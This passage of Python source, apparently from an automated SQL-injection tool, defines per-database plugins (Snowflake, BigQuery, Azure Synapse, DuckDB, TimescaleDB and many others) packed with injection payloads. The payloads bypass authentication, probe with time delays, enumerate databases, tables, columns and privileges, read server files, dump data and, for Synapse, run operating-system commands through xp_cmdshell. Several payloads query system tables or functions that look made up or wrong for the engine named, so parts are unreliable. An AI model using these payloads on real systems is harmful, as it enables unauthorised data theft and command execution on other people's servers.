                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT name FROM system.columns--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT file('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "snowflake",
        "sql",
        dbms="snowflake",
        payloads=["' OR '1'='1", "'; SELECT SYSTEM$WAIT(3, 'MILLISECOND');-- "],
        fingerprints=["snowflake"],
        error_signatures=["snowflake", "syntax error"],
        version_queries=[
            "' UNION SELECT CURRENT_VERSION()--",
            "' UNION SELECT SYSTEM$WHITELIST()--",
        ],
        privilege_checks=["' UNION SELECT CURRENT_USER()--", "' UNION SELECT CURRENT_ROLE()--"],
        os_queries=["' UNION SELECT CURRENT_VERSION()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT database_name FROM information_schema.databases--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"database_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT BUILD_FILE_PATH('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "bigquery",
        "sql",
        dbms="bigquery",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3000000);-- "],
        fingerprints=["bigquery", "google bigquery"],
        error_signatures=["bigquery", "google bigquery"],
        version_queries=["' UNION SELECT @@version--"],
        privilege_checks=["' UNION SELECT current_user()--"],
        os_queries=["' UNION SELECT @@version--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT project_id FROM INFORMATION_SCHEMA.SCHEMATA--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"project_id[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "azure_synapse",
        "sql",
        dbms="azure_synapse",
        payloads=["' OR '1'='1", "'; WAITFOR DELAY '0:0:3'-- "],
        fingerprints=["azure synapse", "synapse sql"],
        error_signatures=["azure synapse", "synapse sql", "microsoft"],
        version_queries=["' UNION SELECT @@version--", "' UNION SELECT DB_NAME()--"],
        privilege_checks=[
            "' UNION SELECT SYSTEM_USER--",
            "' UNION SELECT IS_SRVROLEMEMBER('sysadmin')--",
        ],
        os_queries=["' UNION SELECT @@version--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT name FROM sys.databases--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": [
                    "' UNION SELECT name FROM sys.tables--",
                    "' UNION SELECT table_name FROM information_schema.tables--",
                ],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": [
                    "' UNION SELECT name FROM sys.columns--",
                    "' UNION SELECT column_name FROM information_schema.columns--",
                ],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {
                "payloads": [
                    "' UNION SELECT BulkColumn FROM OPENROWSET(BULK '{path}',SINGLE_CLOB) AS x--"
                ],
            },
            "os": {"payloads": ["'; EXEC master..xp_cmdshell '{command}';--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "apache_derby",
        "sql",
        dbms="apache_derby",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["derby", "apache derby"],
        error_signatures=["derby", "apache derby"],
        version_queries=["' UNION SELECT * FROM SYS.SYSCOLUMNS--"],
        privilege_checks=["' UNION SELECT USER FROM SYS.SYSTABLES--"],
        os_queries=["' UNION SELECT * FROM SYS.SYSCOLUMNS--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT SCHEMANAME FROM SYS.SYSSCHEMAS--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"schemaname[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT TABLENAME FROM SYS.SYSTABLES--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"tablename[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT COLUMNNAME FROM SYS.SYSCOLUMNS--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"columnname[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "presto",
        "sql",
        dbms="presto",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["presto", "facebook presto"],
        error_signatures=["presto"],
        version_queries=["' UNION SELECT version()--"],
        privilege_checks=["' UNION SELECT current_user--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT catalog_name FROM information_schema.schemata--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"catalog_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "trino",
        "sql",
        dbms="trino",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["trino", "presto"],
        error_signatures=["trino"],
        version_queries=["' UNION SELECT version()--"],
        privilege_checks=["' UNION SELECT current_user--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT catalog_name FROM information_schema.schemata--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"catalog_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "duckdb",
        "sql",
        dbms="duckdb",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["duckdb"],
        error_signatures=["duckdb"],
        version_queries=["' UNION SELECT version()--", "' UNION SELECT library_version()--"],
        privilege_checks=["' UNION SELECT current_user--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT database_name FROM information_schema.databases--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"database_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT read_file('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "cubrid",
        "sql",
        dbms="cubrid",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["cubrid"],
        error_signatures=["cubrid"],
        version_queries=["' UNION SELECT db_version()--"],
        privilege_checks=["' UNION SELECT USER()--"],
        os_queries=["' UNION SELECT db_version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT db_name FROM db_dba()--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"db_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT class_name FROM db_class--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"class_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT attr_name FROM db_attribute--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"attr_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "altibase",
        "sql",
        dbms="altibase",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["altibase"],
        error_signatures=["altibase"],
        version_queries=["' UNION SELECT SYSTEM_VERSION FROM V$VERSION--"],
        privilege_checks=["' UNION SELECT USER FROM V$SESSION--"],
        os_queries=["' UNION SELECT SYSTEM_VERSION FROM V$VERSION--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT DB_NAME FROM V$DATABASE--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"db_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT TABLE_NAME FROM SYSTEM_TABLES--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT COLUMN_NAME FROM SYSTEM_COLUMNS--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "mimersql",
        "sql",
        dbms="mimersql",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["mimer", "mimer sql"],
        error_signatures=["mimer", "mimer sql"],
        version_queries=["' UNION SELECT VERSION FROM SYSTEM.VERSION--"],
        privilege_checks=["' UNION SELECT USER FROM SYSTEM.USERS--"],
        os_queries=["' UNION SELECT VERSION FROM SYSTEM.VERSION--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT DNAME FROM INFORMATION_SCHEMA.DATABASES--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"dname[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "cratedb",
        "sql",
        dbms="cratedb",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["cratedb"],
        error_signatures=["cratedb"],
        version_queries=["' UNION SELECT version() FROM sys.nodes--"],
        privilege_checks=["' UNION SELECT current_user--"],
        os_queries=["' UNION SELECT version() FROM sys.nodes--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT schema_name FROM information_schema.schemata--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"schema_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "mckoi",
        "sql",
        dbms="mckoi",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["mckoi"],
        error_signatures=["mckoi"],
        version_queries=["' UNION SELECT Version FROM SYS_ADMIN.SYS_INFO--"],
        privilege_checks=["' UNION SELECT User FROM SYS_ADMIN.SYS_USERS--"],
        os_queries=["' UNION SELECT Version FROM SYS_ADMIN.SYS_INFO--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT Schema FROM SYS_ADMIN.SYS_SCHEMAS--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"schema[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT TableName FROM SYS_ADMIN.SYS_TABLES--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"tablename[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT ColumnName FROM SYS_ADMIN.SYS_COLUMNS--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"columnname[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "cache",
        "sql",
        dbms="cache",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["cache", "intersystems cache"],
        error_signatures=["cache", "intersystems"],
        version_queries=["' UNION SELECT $SYSTEM.Version.GetVersion()--"],
        privilege_checks=["' UNION SELECT $USERNAME--"],
        os_queries=["' UNION SELECT $SYSTEM.Version.GetVersion()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT Name FROM INFORMATION_SCHEMA.DATABASES--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "virtuoso",
        "sql",
        dbms="virtuoso",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["virtuoso", "openlink virtuoso"],
        error_signatures=["virtuoso", "openlink"],
        version_queries=["' UNION SELECT sys_stat('st_db_version')--"],
        privilege_checks=["' UNION SELECT USER--"],
        os_queries=["' UNION SELECT sys_stat('st_db_version')--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT DB_NAME FROM DB.DBA.DATABASES--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"db_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT TABLE_NAME FROM DB.DBA.SYS_TABLES--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT COLUMN_NAME FROM DB.DBA.SYS_COLUMNS--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT file_to_string_output('{path}')--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "frontbase",
        "sql",
        dbms="frontbase",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["frontbase"],
        error_signatures=["frontbase"],
        version_queries=["' UNION SELECT VERSION FROM INFORMATION_SCHEMA.SYS_INFO--"],
        privilege_checks=["' UNION SELECT USER FROM INFORMATION_SCHEMA.SYS_USERS--"],
        os_queries=["' UNION SELECT VERSION FROM INFORMATION_SCHEMA.SYS_INFO--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT DATABASE_NAME FROM INFORMATION_SCHEMA.DATABASES--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"database_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "raima",
        "sql",
        dbms="raima",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["raima", "raima database manager"],
        error_signatures=["raima"],
        version_queries=["' UNION SELECT VERSION FROM SYS.VERSION--"],
        privilege_checks=["' UNION SELECT USER FROM SYS.USERS--"],
        os_queries=["' UNION SELECT VERSION FROM SYS.VERSION--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT DATABASE_NAME FROM INFORMATION_SCHEMA.DATABASES--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"database_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "extremedb",
        "sql",
        dbms="extremedb",
        payloads=["' OR '1'='1", "'; SELECT SLEEP(3);-- "],
        fingerprints=["extremedb"],
        error_signatures=["extremedb"],
        version_queries=["' UNION SELECT VERSION FROM SYS.VERSION--"],
        privilege_checks=["' UNION SELECT USER FROM SYS.USERS--"],
        os_queries=["' UNION SELECT VERSION FROM SYS.VERSION--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT DATABASE_NAME FROM INFORMATION_SCHEMA.DATABASES--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"database_name[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": ["' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--"],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"table_name[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"disabled": True},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
    Plugin(
        "timescaledb",
        "sql",
        dbms="timescaledb",
        payloads=["' OR '1'='1", "'; SELECT pg_sleep(3);-- "],
        fingerprints=["timescaledb"],
        error_signatures=["timescaledb", "postgres"],
        version_queries=[
            "' UNION SELECT extversion FROM pg_extension WHERE extname='timescaledb'--"
        ],
        privilege_checks=["' UNION SELECT current_user--"],
        os_queries=["' UNION SELECT version()--"],
        preferred_techniques="BEUTS",
        extraction_profiles={
            "databases": {
                "payloads": ["' UNION SELECT datname FROM pg_database--"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)", r"datname[:=\s]+([a-z0-9_]+)"],
            },
            "tables": {
                "payloads": [
                    "' UNION SELECT tablename FROM pg_tables--",
                    "' UNION SELECT hypertable_name FROM timescaledb_information_schema.hypertables--",
                ],
                "patterns": [r"table[:=\s]+([a-z0-9_]+)", r"tablename[:=\s]+([a-z0-9_]+)"],
            },
            "columns": {
                "payloads": ["' UNION SELECT column_name FROM information_schema.columns--"],
                "patterns": [r"column[:=\s]+([a-z0-9_]+)", r"column_name[:=\s]+([a-z0-9_]+)"],
            },
            "files": {"payloads": ["' UNION SELECT pg_read_file('{path}',0,2000)--"]},
            "dump": {"payloads": ["' UNION SELECT {columns} FROM {table}--"]},
        },
    ),
]
